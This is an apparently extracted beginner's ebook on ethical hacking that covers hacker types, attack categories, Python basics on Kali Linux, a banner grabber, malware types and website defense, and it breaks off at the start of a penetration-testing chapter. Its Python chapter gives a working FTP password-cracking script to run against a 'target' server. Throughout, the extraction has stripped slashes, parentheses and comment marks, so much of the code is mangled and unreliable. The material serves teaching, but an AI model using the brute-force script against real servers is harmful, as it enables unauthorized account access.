Table	of	Contents Chapter	1:	The	Fundamentals	of	Hacking Chapter	2:	Hacking	-	A	Guide	for	Beginners Chapter	3:	How	to	Hack	with	Python Chapter	4:	Basic	Computer	Security Chapter	5:	Penetration	Testing Chapter	6:	Specific	Hacking	Techniques Chapter	7:	How	to	Protect	Yourself Conclusion    Chapter	1:	The	Fundamentals	of	Hacking  There	are	three	types	of	hackers:  1.	 White	hat 2.	 Black	hat 3.	 Gray	hat.  A	white	hat	 also	known	as	ethical 	hacker	tries	to	breach	network	systems	in	order	to	help businesses	 and	 organizations	 in	 improving	 their	 digital	 defenses.	 A	 black	 hat	 hacker, meanwhile,	 accesses	 digital	 records	 and or	 devices	 for	 malicious	 purposes.	 A	 gray	 hat hacker	is	a	combination	of	the	first	two	types:	he	may	be	a	white	hat	this	time	and	become a	black	hat	in	the	next.  Important	Note:	There	are	laws	that	prohibit	black	hat	hacking.	You	can	get	incarcerated	if you’ll	try	to	access	digital	information	without	the	owner’s	permission.	Because	of	that, this	book	will	help	you	become	an	ethical	hacker.	It	will	provide	you	with	tips,	tricks,	and techniques	that	you	can	use	in	hacking	systems	ethically.  	   Benefits	of	Ethical	Hacking  To	protect	yourself	from	thieves,	you	need	to	think	like	one.	This	principle	serves	as	the core	of	white	hat	hacking.  The	total	number	of	hackers	is	growing	each	day.	And	these	people	are	on	a	continuous quest	 to	 improve	 their	 skills	 and	 expand	 their	 knowledge.	 If	 you	 will	 consider	 the vulnerabilities	that	exist	in	machines	and	digital	networks,	you	will	realize	the	awful	state of	security	that	people	have	against	hackers.	You	need	to	protect	your	system	from	the	bad guys.	To	achieve	this	goal,	you	should	know	how	to	hack.  The	goals	of	a	white	hat	hacker	are:  Attack	a	system	without	destroying	it Identify	system	vulnerabilities Prove	that	vulnerabilities	exist Help	in	improving	the	security	of	his	target  	   Different	Types	of	Hacking	Attacks  Hackers	divide	their	attacks	into	different	types.	These	types	are: Nontechnical These	 techniques	 focus	 on	 the	 end-users	  i.e.	 the	 people	 who	 use	 the	 target	 devices . Because	 humans	 have	 a	 natural	 tendency	 to	 trust	 others,	 hackers	 can	 break	 through	 a system’s	 defenses	 without	 using	 any	 electronic	 tool.	 These	 hackers	 may	 use	 “social engineering”	tactics	to	obtain	a	user’s	trust	and	gain	access	to	a	network	or	file.	You’ll learn	more	about	social	engineering	later	on.  A	hacker	may	also	implement	a	physical	attack	against	his	target.	For	instance,	he	may break	 into	 a	 computer	 room	 and	 access	 one	 or	 more	 devices	 that	 are	 present.	 As	 an alternative,	 he	 may	 check	 the	 dumpsters	 in	 the	 building	 and	 try	 to	 look	 for	 useful information	 e.g.	passwords .	Hackers	refer	to	this	approach	as	“dumpster	diving”.  	 Network Hackers	 can	 implement	 this	 kind	 of	 attack	 easily,	 since	 most	 networks	 are	 accessible through	the	internet.	The	most	common	forms	of	network	attacks	are:  Accessing	a	network	using	a	rigged	modem Taking	advantage	of	vulnerabilities	in	digital	transport	mechanisms	 e.g.	NetBIOS  Sending	a	continuous	stream	of	requests	to	a	network Rigging	the	system	and	collecting	data	packets	to	access	confidential	information  	  Operating	System These	attacks	play	an	important	role	in	any	hacker’s	toolkit.	That’s	because	each	computer has	an	operating	system.	And	there	are	a	lot	of	tools	that	you	can	use	to	crack	the	OS	 i.e. operating	system 	of	a	computer.  There	are	a	lot	of	operating	systems	out	there.	However,	hackers	usually	focus	on	the	most popular	ones	 e.g.	Windows	systems .	Here	are	some	of	the	OS	attacks	that	you	can	use:  Destroying	the	security	of	a	file	system Deciphering	passwords Attacking	pre-installed	authentication	mechanisms   Taking	advantage	of	vulnerabilities	in	certain	protocols  	 Application Some	hackers	utilize	computer	programs	to	attack	networks.	Often,	a	hacker	gains	access to	 a	 machine	 through	 a	 web-based	 application	 or	 an	 email-related	 program.	 The	 most popular	members	of	this	type	are:  Sending	“spam”	 i.e.	junk	mail 	to	people Installing	malware	 i.e.	malicious	software 	in	target	systems Bypassing	 security	 mechanisms	  e.g.	 firewall 	 through	 “online”	 protocols	  e.g. SMTP,	HTTP,	IMAP,	etc.     Chapter	2:	Hacking	-	A	Guide	for	Beginners  There	are	many	learning	materials	for	hackers.	Most	of	these	materials	are	free,	so	you won’t	have	to	spend	any	money	just	to	develop	your	hacking	skills.	Unfortunately,	most	of the	hacking	resources	that	you’ll	find	are	created	for	intermediate	and or	expert	hackers. You	won’t	benefit	from	the	said	materials	if	you	are	a	complete	beginner.  In	this	chapter,	you	will	discover	a	quick	and	easy	way	to	become	a	hacker.	The	three-step learning	program	that	you	will	see	here	is	created	for	newbies.	It	will	help	you	master	the basics	of	hacking	using	a	logical	method	of	learning.  	 First	Step	–	Learn	More	about	Computers	and	Networks Hacking	involves	computers	and	networks.	It	requires	advanced	computer	knowledge	and networking	 skills.	 Obviously,	 you	 won’t	 be	 able	 to	 hack	 a	 computer	 if	 you	 don’t	 even know	 the	 difference	 between	 TCP IP	 and	 Windows	 XP.	 To	 become	 a	 hacker,	 you	 must know	the	basics	of	computer-related	technology.  It	would	be	best	if	you’ll	expose	yourself	to	different	operating	systems.	More	and	more people	are	switching	to	Linux	systems	so	you	should	learn	the	basics	of	that	OS.	Once	you have	mastered	the	basics	of	computers	and	networks,	understanding	how	“exploits”	and “vulnerabilities”	work	will	be	easy.  	 Second	Step	–	Read	Basic	Hacking	Books There	 are	 countless	 hacking	 books	 out	 there.	 A	 basic	 Google	 search	 will	 give	 you hundreds	 of	 available	 learning	 materials.	 However,	 since	 you	 are	 new	 to	 the	 hacking world,	you	should	focus	on	the	basic	ideas	and	principles	of	hacking.	It	is	tempting	to	grab books	about	advanced	topics	such	as	Wireshark	utilization	or	payload	selection,	but	you won’t	benefit	from	this	study	method.	The	ideal	learning	strategy	for	a	complex	concept  like	computer	hacking 	is	to	master	the	basics	and	build	up	your	knowledge	and	skills slowly.  This	eBook	will	cover	the	basic	aspects	of	hacking.	After	reading	this	book,	you’ll	be	able to	attack	systems	and	understand	complex	ideas	related	to	digital	security.   	 Third	Step	–	Learn	How	to	Program If	you	want	to	be	a	skilled	hacker,	you	should	know	how	to	create	your	own	programs. Programming	skills	are	important	for	anyone	who	is	serious	about	hacking.	It	is	true	that there	 are	 tons	 of	 programs	 and	 ready-made	 tools	 available	 online.	 However,	 relying	 on other	 people’s	 work	 is	 not	 a	 good	 idea.	 The	 ability	 to	 create	 your	 own	 programs	 and modify	 existing	 hacking	 tools	 can	 help	 you	 greatly	 in	 your	 quest	 to	 become	 a	 hacking expert.  There	are	a	lot	of	programming	languages	that	you	can	choose	from.	But	if	you	are	a	total newbie,	 you	 should	 study	 Python	 first.	 Python	 is	 one	 of	 the	 simplest	 programming languages	 out	 there.	 However,	 it	 is	 extremely	 effective	 in	 writing	 codes	 for	 hacking purposes.	 This	 is	 the	 main	 reason	 why	 many	 hackers	 prefer	 this	 language	 over	 C++	 or Ruby.	You’ll	learn	more	about	Python	in	the	next	chapter.    Chapter	3:	How	to	Hack	with	Python  Python	is	one	of	the	best	programming	languages	for	hacking.	This	language	is	easy	to learn	and	powerful	enough	to	satisfy	all	of	your	programming	needs.	In	this	chapter,	you’ll learn	the	basics	of	Python.	You	will	know	how	to	launch	it,	how	to	write	codes	with	it,	and how	to	compile	it.  Important	Note:	This	chapter	assumes	that	you	are	using	Kali	Linux,	an	operating	system that	is	created	for	hackers.	Kali	Linux	contains	hundreds	of	built-in	hacking	tools	that	you can	use	to	test	your	systems	or	attack	other	networks.	In	addition,	this	OS	is	completely free.	To	download	Kali	Linux,	please	visit:	https:  www.kali.org downloads .  Screenshot	of	the	Kali	Linux	OS  	   How	to	Get	Python	Modules  An	excellent	benefit	of	using	Kali	Linux	is	that	it	comes	with	a	pre-installed	version	of Python.	That	means	you	can	start	writing	codes	without	downloading	anything.  The	default	modules	and	language	library	of	Python	allow	you	to	perform	a	wide	range	of activities.	 For	 instance,	 the	 ready-made	 version	 of	 Python	 has	 exception	 handling,	 file handling,	math	and	number	modules,	and	data	types.  Python’s	built-in	tools	and	components	are	enough	to	create	effective	hacking	tools.	But you	 can	 enhance	 the	 effectiveness	 and	 flexibility	 of	 this	 language	 by	 downloading additional	 modules	 from	 third-party	 sources.	 These	 extra	 modules	 are	 the	 main	 reason why	many	hackers	choose	Python	for	their	programming	needs.	If	you	want	a	complete list	 of	 all	 site: http:  pypi.python.org pypi.  third-party	 modules	  for	 Python,	 visit	  the	 available	  this	  	 Installing	a	Module Just	 like	 other	 Linux	 systems,	 Kali	 Linux	 requires	 “wget”	 when	 acquiring	 new	 files	 or programs	from	the	internet.	This	command	downloads	your	chosen	file	or	program	from its	respective	repository.	Then,	you	have	to	decompress	the	downloaded	module	and	issue the	following	command:  python	setup.py	install  	  Let’s	assume	that	you	want	to	download	Nmap	 a	python	module 	from	www.xael.org.	To get	this	module,	you	must:  1.	 Turn	on	your	Kali	Linux	computer. 2.	 Launch	a	terminal	 the	small	window	that	takes	user	inputs . 3.	 Type	the	following	code:  Kali	>	wget	http:  xael.org norman python python-nmap python-nmap-0.3.4.tar.gz  	  4.	 Extract	the	file	by	typing:  Kali	>	tar	–xzf	python-nmap-0.3.4.tar.gz   5.	 Access	the	directory	you	created	by	entering:  Kali	>	cd	python-nmap-.03.4   6.	 Issue	the	code	given	below	to	finish	the	process:  Kali	>	python	setup.py	install  	  	  	  7.	 If	you	did	everything	correctly,	your	terminal	should	look	like	this:  Congratulations.	 You	 successfully	 installed	 a	 Python	 module	 on	 your	 Kali	 Linux computer.	Now,	you	can	use	the	said	module	for	your	hacking	activities.  Important	 Note:	 This	 is	 the	 method	 that	 you	 must	 use	 to	 add	 more	 modules	 to	 your operating	system.	It	might	seem	long	and	complex	at	first.	But	once	you	get	used	to	it, creating	a	large	collection	of	third-party	modules	will	be	a	walk	in	the	park.  	   How	to	Write	Python	Scripts  In	this	part	of	the	book,	you’ll	learn	how	to	write	codes	using	the	Python	language.	It	will also	 explain	 the	 fundamental	 terms,	 concepts,	 and	 syntax	 of	 Python	 codes.	 Read	 this material	carefully;	it	will	help	you	become	a	knowledgeable	programmer	and	hacker.  Important	Note:	You	need	to	use	a	text	editor	when	writing	codes.	Kali	Linux	has	a	built- in	text	editor	called	“Leafpad”.		As	you	can	see,	Kali	Linux	contains	everything	you	need to	hack	computers	and	systems.  	 Proper	Formatting Formatting	 plays	 an	 important	 role	 in	 the	 Python	 language.	 The	 interpreter	 of	 Python groups	codes	based	on	their	format.	Keep	in	mind	that	consistency	is	more	important	than precision.	You	don’t	have	to	follow	strict	formatting	rules.	You	just	have	to	be	consistent with	the	format	you	are	using.  For	example,	if	you’ll	use	double	indentation	to	differentiate	a	code	block,	indent	each	line of	 that	 code	 block	 twice.	 Forgetting	 this	 simple	 rule	 can	 lead	 to	 error	 messages	 and or failed	attacks.  	 How	to	Run	a	Python	File Nothing	beats	active	learning.	To	help	you	master	this	process,	let’s	write	a	basic	piece	of code	using	Leafpad.	Here’s	the	code:  !	 user bin python  name=” ”  print	“Hi,	”	+	name	+	“!”  	  Save	the	file	as	“sample.py”.  This	 code	 consists	 of	 three	 lines.	 The	 first	 one	 triggers	 the	 interpreter	 of	 Python.	 The second	 one	 creates	 a	 variable	 called	 “name”	 and	 sets	 a	 value	 for	 it.	 The	 last	 line concatenates	the	word	“Hi”	with	the	user’s	input	and	inserts	an	exclamation	mark.  At	this	point,	you	can’t	execute	the	code	yet.	You	must	give	yourself	the	permission	to	run   it	first.	In	Kali	Linux,	the	command	that	you	should	use	is	“chmod”.  Important	 Note:	 To	 learn	 more	 about	 Linux	 permissions,	 please	 check	 this	 site: https:  www.linux.com learn understanding-linux-file-permissions.  The	code	that	you	must	type	is:  chmod	755	sample.py  	  Hi,	Chuck	Norris!  After	issuing	that	command	using	a	terminal,	your	screen	will	show	you	this:  	 How	to	Add	a	Comment You	 can	 add	 comments	 to	 your	 Python	 codes.	 In	 programming,	 a	 comment	 is	 a	 word, sentence,	 or	 paragraph	 that	 defines	 what	 a	 piece	 of	 code	 can	 do.	 It	 doesn’t	 affect	 the functionality	or	behavior	of	the	code	itself.	Adding	a	comment	to	your	codes	isn’t	required but	 nonetheless	 advised.	 Comments	 will	 help	 you	 remember	 important	 information regarding	your	codes.	Obviously,	you	don’t	want	to	forget	the	“internal	mechanisms”	of your	own	programs.  The	interpreter	of	Python	skips	each	comment.	That	means	the	interpreter	will	jump	over words,	sentences	or	paragraphs	until	it	finds	a	legitimate	code	block.	In	Python,	you	need to	 use	 “”	 to	 set	 a	 single-line	 comment.	 For	 multiline	 comments,	 you	 must	 type	 three double	quotes.	These	symbols	must	appear	at	the	beginning	of	your	comments.  Here	are	some	comments	written	in	the	Python	language:  1.	 	Hi,	I’m	a	single-line	comment. 2.	 “””  Hi,  I’m  A  Multiline  Comment  “””   	 Modules With	 Python,	 you	 can	 divide	 your	 codes	 into	 separate	 modules.	 You	 must	 “import”	 a module	in	order	to	use	it.	When	importing	a	module,	you	will	access	the	classes,	methods, and	 functions	  you’ll	 learn	 about	 these	 later 	 that	 are	 present	 inside	 that	 module.	 This feature	 is	 one	 of	 the	 major	 reasons	 why	 Python	 is	 the	 preferred	 computer	 language	 of computer	hackers.  	   Object-Oriented	Programming  At	this	point,	it’s	important	to	discuss	object-oriented	programming	 or	OOP .	OOP	is	a coding	 model	 that	 serves	 as	 the	 core	 principle	 behind	 major	 computer	 languages	  e.g. Java .	You	need	to	understand	OOP	if	you	want	to	be	a	skilled	hacker.  	 The	Components	of	an	Object Each	object	has	methods	 things	it	can	do 	and	properties	 states	or	attributes .  OOP	 allows	 programmers	 to	 link	 their	 activities	 with	 the	 real	 world.	 For	 instance,	 a computer	has	methods	 e.g.	turns	on,	accesses	the	internet,	launches	applications,	etc. 	and properties	 e.g.	available	space,	processing	speed,	brand,	etc. .	If	you’ll	think	of	OOP	as	a human	language,	objects	are	nouns,	methods	are	verbs,	and	properties	are	adjectives.  Each	 object	 belongs	 to	 a	 class.	 A	 computer,	 for	 example,	 belongs	 to	 the	 class	 called “machines”.	 “Machines”	 is	 the	 class,	 “computers’	 is	 a	 subclass,	 and	 “laptops”	 is	 a	 sub- subclass.  An	object	gets	the	characteristics	of	its	class.  	 Variables Variables	point	to	information	that	exists	in	a	computer’s	memory.	In	Python,	this	memory can	keep	different	pieces	of	data	 e.g.	strings,	lists,	integers,	Booleans,	dictionaries,	real numbers,	etc. .  Variable	types	act	like	classes.	The	script	you’ll	see	below	shows	some	of	these	types.  Launch	a	text	editor	and	type	the	following	code:  !usr bin python   SampleStringVariable	=	“This	is	an	awesome	variable.”;  SampleList	=	[10,20,30,40,50]  SampleDictionary	=	{‘example’:	‘Hacker’,	‘number’:	23}  print	SampleStringVariable  	   After	running	that	script,	you	will	see	the	following	message	on	your	screen:  This	is	an	awesome	variable.  Important	Note:	Python	can	choose	the	right	type	of	variable	on	your	behalf.	You	don’t have	to	declare	the	variable	before	setting	its	value.  	 Functions The	 Python	 language	 comes	 with	 preinstalled	 functions.	 Kali	 Linux	 has	 an	 extensive collection	of	functions,	although	you	may	download	more	from	online	libraries.	Here	are some	functions	that	you’ll	use	in	your	programs:  int  	–	Use	this	function	to	truncate	numeric	data.	It	simply	gives	the	integer	part	of the	argument. len  	–	This	function	counts	the	items	in	a	list. exit  	–	This	function	lets	you	exit	a	program. max  	–	With	this	function,	you	can	determine	the	highest	value	of	a	list. type  	–	Use	this	function	to	identify	the	data	type	of	a	Python	object. float  	–	This	function	converts	its	argument	into	a	floating-point	numeral. sorted  	–	Use	this	function	to	sort	the	entries	of	a	list. range  	–	This	function	gives	a	list	of	numbers	between	two	specific	values.	You need	to	set	the	said	values	as	the	function’s	arguments.  	 Lists Most	programming	languages	use	arrays.	An	array	is	a	collection	of	different	objects.	You may	retrieve	an	entry	from	an	array	by	specifying	the	position	of	the	former.	For	example, you	can	get	the	fourth	value	of	an	array	by	typing	[4].	Python	has	a	similar	feature,	but	it is	known	as	“list”.  Python	lists	are	“iterable”.	That	means	you	can	use	them	for	your	loop	statements	 you’ll learn	more	about	loops	later .	Let’s	assume	that	you	want	to	retrieve	the	third	element	of the	“SampleList”	 i.e.	the	one	you	created	earlier .	Here	are	the	things	that	you	should	do:  1.	 Type	the	word	“print”.	This	command	allows	you	to	display	information. 2.	 Specify	the	name	of	the	list	 i.e.	SampleList . 3.	 Add	a	pair	of	brackets.   4.	 Insert	“2”	between	the	brackets.	This	number	signifies	the	position	of	the	item	you want	to	retrieve.	It	is	important	to	note	that	the	numbering	begins	at	zero.	Thus, typing	 “1”	 will	 give	 you	 the	 second	 element,	 typing	 “2”	 will	 give	 you	 the	 third element,	etc.  The	Python	script	should	look	like	this:  print	SampleList[2]  If	you	did	everything	correctly,	your	terminal	should	display	this:  	  	  30   How	to	Network	with	the	Python	Language  Python	 has	 a	 module	 called	 “socket”.	 This	 module	 allows	 you	 to	 build	 network connections	 using	 the	 Python	 language.	 Let’s	 see	 how	 this	 module	 works.	 For	 this example,	you’ll	use	“socket”	to	build	a	TCP	 Transmission	Control	Protocol 	connection.  The	steps	that	you	need	to	take	are:  1.	 Import	the	right	module. 2.	 Create	 a	 variable	 that	 belongs	 to	 a	 class	 called	 “socket”.	 Set	 “practice”	 as	 the  variable’s	name.  3.	 Use	the	method	named	“connect  ”	to	establish	a	connection	to	a	port.	The	actual process	ends	here.	The	remaining	steps	will	show	you	some	of	the	things	you	can do	after	establishing	a	connection.  4.	 Use	“recv”	to	acquire	1024	data	bytes	from	the	current	socket. 5.	 Save	the	information	in	a	new	variable	called	“sample”. 6.	 Print	the	information	inside	the	“sample”	variable. 7.	 Terminate	the	connection. 8.	 Save	the	code	as	“samplesocket”	and	issue	“chmod”.  Your	code	should	look	like	this:  !usr bin env	python  import	socket  practice	=	socket.socket    practice.connect  “192.168.1.107”,	22    sample	=	practice.recv 1024   print	sample  practice.close  	  	  	  	  	   Run	that	code	and	link	your	computer	to	another	one	using	the	22nd	port.	If	SSH	 Secure Socket	Shell 	is	active	in	that	port,	you	will	get	the	banner	of	the	second	computer	into your	“sample”	variable.	Then,	the	information	will	appear	on	your	screen.  Basically,	the	code	you	created	is	a	“banner	grabber”.  	   Dictionaries  A	dictionary	is	an	object	that	can	hold	items	 called	“elements” .	You	can	use	a	dictionary to	record	the	usernames	of	your	targets	or	the	vulnerabilities	of	a	network.  Dictionaries	require	a	key-value	pair.	They	can	store	several	copies	of	a	value.	However, each	key	must	be	unique.	Like	a	Python	list,	a	dictionary	is	iterable.	You	can	use	it	with your	“for”	statements	to	create	complex	scripts.	In	addition,	you	may	use	a	dictionary	to create	your	own	password	crackers.  The	syntax	for	creating	a	new	dictionary	is:  dict	=	{firstkey:firstvalue,	secondkey:secondvalue,	thirdkey:thirdvalue…}  	   Control	Statements  Computer	programs	need	the	ability	to	decide.	In	the	Python	language,	you	have	several options	on	how	to	manage	the	arrangement	of	your	code.	For	example,	you	may	combine the	“if”	and	“else”	statements	to	create	powerful	hacking	tools.  Let’s	discuss	some	of	the	most	popular	control	statements	of	Python: The	“if”	Statement The	syntax	of	this	statement	is  if	   …  Important	 Note:	 You	 must	 indent	 the	 statement’s	 “control	 block”	  the	 code	 block	 that comes	after	the	expression . The	“if	…else”	Statement To	use	this	statement,	you	must	use	the	following	syntax:  if	   The	 script	 given	 below	 checks	 the	 “ID”	 of	 the	 current	 user.	 If	 the	 value	 is	 zero,	 the terminal	will	display	“Hey,	you	are	the	root	user.”	If	the	value	is	non-zero,	the	resulting message	will	be	“Hey,	you	are	an	ordinary	user.”  If	userid	==	0:  else  print	“Hay,	you	are	the	root	user.”  print	“Hay,	you	are	an	ordinary	user.”  else  …  …  	  	  	   Loops A	loop	is	another	powerful	feature	of	Python.	The	most	popular	forms	of	loops	are	“for” and	“while”.	Let’s	discuss	each	form	in	detail:  1.	 The	“for”	Loop  This	kind	of	loop	sets	data	from	a	Python	object	 e.g.	list 	to	loop	a	variable														 continuously.	 In	 the	 following	 example,	 the	 “for”	 loop	 will	 enter	 different	 	 	 	 	 	 	 	 	 	 	 	 	 	 passwords:  passwords	=	[“ftp”,	“sample”,	“user”,	“admin”,	“backup”,	“password”]  for	password	in	passwords  attempt	=	connect username,password   2.	 The	“while”	Loop  	  	  A	while	loop	checks	the	value	of	a	Boolean	statement	and	executes	a	piece	of														 code	while	the	value	of	the	statement	is	“true”.	Keep	in	mind	that	Boolean														 statements	only	have	two	possible	values:	 1 	true,	or	 2 	false.   How	to	Create	a	Password	Cracker  At	 this	 point,	 you’ve	 learned	 many	 things	 about	 the	 Python	 language.	 Let’s	 use	 that knowledge	to	create	a	hacking	tool:	a	password	cracker.	The	program	that	you	will	create is	designed	for	FTP	 File	Transfer	Protocol 	accounts.	Here	are	the	steps:  1.	 Launch	a	text	editor. 2.	 Import	three	modules:	 1 	socket,	 2 	re,	and	 3 	sys. 3.	 Generate	one	socket	that	connects	to	a	specific	IP	address	through	the	21st	port. 4.	 Create	a	variable. 5.	 Generate	a	list	named	“passwords”	and	fill	it	with	various	passwords. 6.	 Write	 a	 loop	 to	 test	 each	 password.	 The	 process	 will	 continue	 until	 all	 of	 the passwords	have	been	used	or	the	program	gets	“230”	as	a	response	from	the	target FTP	server.  The	code	that	you	must	type	is:  !usr bin 	python  	  import	socket  import	re  import	sys  def	connect username,password :  sample	=	socket.socket socket.AF_INET,	socket.SOCK_STREAM   print	“[*]	Checking	“+	username	+	“:”	+	password  sample.connect  192.168.1.105,	21    data	=	sample.recv 1024   sample.send ‘USER	‘	+	username	+	‘\r\n’   data	=	sample.recv 1024   sample.send ‘PASS	‘	+	password	+	‘\r\n’   data	=	sample.recv 3   sample.send ‘QUIT		\r\n’    sample.close    returen	data  username	=	“SampleName”  passwords	=	[“123”,	“ftp”,	“root”,	“admin”,	“test”,	“backup”,	“password”]  for	password	in	passwords:  attempt	=	connect username,	password   if	attempt	==	“230”:  														print	“[*]	password	found:	”	+	password  sys.exit 0   	  	  Save	the	file	as	“passwordcracker.py”.	Then,	obtain	the	permission	to	execute	the	program and	run	it	against	your	target	FTP	server.  Important	Note:	The	code	given	above	isn’t	cast	in	stone.	You	may	modify	it	according	to your	 preferences	 and or	 situation.	 Once	 you	 become	 a	 skilled	 Python	 programmer,	 you will	be	able	to	improve	the	flexibility	and	effectiveness	of	this	password	cracker.    Chapter	4:	Basic	Computer	Security  This	chapter	will	focus	on	topics	related	to	computer	security	 e.g.	privacy,	networking, passwords,	etc. .	After	reading	this	article,	you	will	know	how	to	protect	yourself	from other	 hackers.	 You	 will	 also	 know	 how	 to	 execute	 attacks	 against	 the	 defenses	 of	 your targets.	 You	 must	 read	 this	 material	 carefully:	 computer	 security	 is	 important	 for	 the “offense”	and	“defense”	of	hacking.  	   Passwords  You	should	treat	security	as	an	important	part	of	using	a	computer.	You	are	probably	using the	 internet	 to	 perform	 a	 research,	 read	 your	 emails,	 buy	 stuff,	 or	 sell	 your	 own merchandise.	 These	 things	 have	 become	 easier	 because	 of	 computers	 and	 networks. However,	this	convenience	comes	with	a	hefty	price:	lack	of	security.  The	following	tips	will	help	you	in	protecting	yourself	from	hackers:  Don’t	 share	 your	 usernames	 and	 passwords	 to	 anyone	  not	 even	 your	 closest friends . Read	the	security privacy	policies	of	each	site	that	you	will	access	before	entering personal	data. Don’t	buy	anything	from	untrusted	sites.	The	last	thing	you	want	to	do	is	give	your money	and or	financial	information	to	unscrupulous	individuals.	If	you	want	to	buy something	 online,	 look	 for	 trustworthy	 sites	 such	 as	 www.amazon.com	 and www.ebay.com. Do	not	share	the	login	credentials	of	your	email	accounts	with	other	people.	Some emails	contain	private	and or	confidential	information.  Keep	in	mind	that	keeping	your	passwords	secret	isn’t	enough.	A	hacker	can	still	access that	 piece	 of	 information	 through	 a	 keylogger.	 Basically,	 a	 keylogger	 is	 a	 program	 that records	all	the	keys	that	you	press.	To	protect	your	computer	from	keyloggers,	you	should:  Make	sure	that	your	computer’s	firewall	is	on Run	spyware adware	scanners	on	a	regular	basis Use	an	on-screen	keyboard	to	enter	your	login	credentials Install	an	anti-malware	program	on	your	machine  	   Malware  The	term	“malware”	refers	to	programs	that	are	designed	to	“infect”	an	electronic	device  e.g.	computer,	tablet,	smartphone,	etc. .	Let’s	discuss	the	different	types	of	malware:  	 Viruses Basically,	 viruses	 are	 computer	 programs	 that	 infect	 other	 programs.	 Most	 viruses	 run only	when	the	program	they	infected	runs.	This	is	the	main	reason	why	viruses	are	hard	to detect.	A	virus	has	two	parts:	the	“infector”	and	the	“payload”.	Keep	in	mind,	however, that	 the	 payload	 is	 not	 required.	 That	 means	 a	 harmless	 program	 is	 still	 a	 virus	 if	 it attaches	itself	to	a	trusted	computer	program.  	 Trojans This	 term	 came	 from	 the	 legendary	 “Trojan	 Horse”,	 a	 large	 wooden	 horse	 that	 spelled doom	 for	 Troy.	 In	 hacking,	 a	 Trojan	 is	 a	 program	 that	 contains	 other	 programs.	 The “container”	is	typically	harmless.	In	fact,	it	can	be	a	program	that	attracts	unsuspecting users.	Once	a	person	downloads	and	installs	a	Trojan	program,	the	malware	inside	will spread	in	the	target	machine.  	 Spyware This	 is	 one	 of	 the	 most	 dangerous	 malware	 out	 there.	 Basically,	 spyware	 records	 the activities	 you	 do	 on	 your	 computer	 and	 transmits	 the	 data	 to	 the	 hacker.	 This	 data transmission	occurs	via	the	internet.	Hackers	divide	spyware	into	two	types:	harmless	and harmful.	Harmless	spyware	focuses	on	non-confidential	data	 e.g.	the	websites	you	visit . Harmful	spyware,	on	the	other	hand,	collects	confidential	information	 e.g.	passwords .  	 Adware Basically,	adware	is	a	form	of	malware	that	shows	advertisements	on	a	person’s	computer. This	malware	becomes	extremely	active	whenever	the	infected	machine	is	online.  It	is	true	that	adware	is	one	of	the	safest	forms	of	malicious	programs.	However,	it	can	be   frustrating	if	a	pop-up	advertisement	will	appear	whenever	you	click	on	a	browser.  	 How	to	Fight	Malicious	Programs Staying	away	from	unscrupulous	sites	can	help	you	prevent	malware	infection.	However, it	is	likely	that	some	malicious	programs	will	still	latch	onto	your	machine.	It	would	be best	 if	 you	 will	 install	 a	 reputable	 anti-malware	 program	 and	 scan	 your	 computer regularly.	Here	are	some	of	the	most	popular	antivirus	programs	today:  Norton	Security AVG	Internet	Security Avast	Antivirus McAfee	Antivirus  Important	 Note:	 If	 you’re	 an	 active	 internet	 user,	 you	 should	 scan	 your	 computer	 for malware	at	least	once	a	week.	Adjust	this	frequency	to	twice	or	thrice	a	week	if	you’re dealing	with	confidential	information.  	   Web	Security  Hacking	 and	 digital	 security	 are	 not	 limited	 to	 computers.	 These	 topics	 also	 apply	 to websites.	In	this	part	of	the	book,	you’ll	learn	a	lot	about	the	basic	defenses	of	a	website. You	can	use	this	information	to	protect	your	site	from	hackers	or	launch	attacks	against your	targets.  	 The	Fundamentals Website	security	consists	of	two	aspects:	internal	and	external.	The	internal	aspect	refers to	the	nature	of	the	information	you	are	handling.	For	instance,	your	website	is	secure	if you	 are	 not	 dealing	 with	 confidential	 data.	 Few	 hackers	 would	 attack	 your	 site	 if	 they won’t	benefit	from	it.	The	external	aspect,	on	the	other	hand,	involves	the	settings	of	your website,	the	applications	you	installed	on	it,	and	the	codes	you	used	in	creating	it.  	 How	to	Keep	a	Website	Secure The	best	way	to	keep	a	site	secure	is	by	turning	it	off.	This	way,	hackers	won’t	have	any way	to	access	your	files.	If	you	need	a	live	website,	however,	you	should	minimize	the open	ports	and	services	that	you	offer.	Unfortunately,	these	options	are	not	applicable	for most	 businesses	 and	 organizations.	 That	 means	 a	 lot	 of	 websites	 are	 prone	 to	 hacking attacks.  Important	Note:	Websites	that	have	open	ports,	services,	and	different	scripting	languages are	vulnerable	 to	hackers.	 That’s	because	 a	 hacker	can	 use	a	 port,	service,	 or	 computer language	to	bypass	the	defenses	of	a	website.  You	can	protect	your	site	by	updating	all	of	its	applications	regularly.	You	also	need	to apply	security	updates	and	patches	on	your	website.  	 Website	Vulnerabilities Here’s	 a	 basic	 truth:	 your	 website	 has	 vulnerabilities.	 It	 can	 be	 an	 open	 port,	 an	 active service,	 or	 a	 fault	 in	 the	 code	 used	 in	 crafting	 your	 site.	 These	 vulnerabilities	 serve	 as doors	that	hackers	can	use	to	get	inside	your	network	or	server.	In	addition,	hackers	tend to	share	their	knowledge	with	others.	If	a	hacker	detects	a	vulnerability	in	a	popular	app	or   website,	it’s	likely	that	he	will	share	the	information	with	others.	He	might	also	create	a hacking	tool	for	that	target	and	distribute	the	former	to	his	“brothers”	and or	“sisters”.  It’s	important	to	keep	yourself	updated	with	the	latest	vulnerabilities	of	your	systems.	Get the	latest	patch	for	your	website	whenever	possible.  	 Two	Defense	Strategies Here	are	two	strategies	that	you	can	choose	from:  1.	 Build	Strong	Defenses	–	This	strategy	requires	constant	attention	and	effort	from the	 website	 owner	 or	 his	 “IT	 people”.	 With	 this	 strategy,	 you	 need	 to	 secure	 the latest	updates	and	patches	for	your	site,	review	your	online	apps	regularly,	and	hire experienced	programmers	to	work	on	your	website.  2.	 Detect	and	Fix	Vulnerabilities	–	This	strategy	relies	on	a	website	scanning	program or	 service.	 This	 “web	 scanner”	 looks	 for	 existing	 vulnerabilities	 in	 your	 apps, equipment,	and	website	scripts.  The	first	strategy	is	logical:	you’ll	build	a	“high	wall”	around	your	website	to	make	sure that	hackers	can’t	attack	it.	However,	it	requires	a	lot	of	time,	effort,	and	attention.	That	is the	main	reason	why	website	owners	prefer	the	second	strategy.	Obviously,	it	is	better	to check	 whether	 vulnerability	 actually	 exists	 than	 building	 “walls”	 to	 protect	 imaginary weaknesses.	 Here,	 you	 will	 only	 spend	 time,	 effort,	 and	 money	 on	 fixing	 vulnerability once	the	existence	of	that	vulnerability	has	been	proven.    Chapter	5:	Penetration	Testing  Penetration	testing	 also	called	ethical	hacking 	is	the	process	of	attacking	a	network	